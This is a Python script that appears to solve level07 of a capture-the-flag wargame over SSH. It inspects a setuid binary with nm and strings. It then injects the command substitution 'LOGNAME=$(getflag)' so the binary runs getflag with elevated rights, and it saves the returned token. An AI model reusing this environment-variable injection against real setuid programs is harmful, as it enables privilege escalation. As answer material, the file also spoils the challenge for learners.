import sys

sys.path.append("../..")

from utils.ssh import sanitize_token, connect_by_previous, exec, save_token
from utils.text import print_title, print_output

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list)

file_info = exec(client, 'nm level07 | grep set', title='Inspect binary by nm')
print_output(file_info, 'Interested thing')
print_title('Set uid while execute, what we need, again!')

file_info = exec(client, 'strings level07 | awk "/LOGNAME|echo/"', title='Inspect binary by strings')
print_output(file_info, 'Interested thing')
print_title('Binary display LOGNAME env by echo')

token_raw = exec(client, 'LOGNAME=$\(getflag\) && ./level07', title='Execute binary with new LOGNAME')[0]
print_output(token_raw)

token = sanitize_token(token_raw)
save_token(token)

client.close()
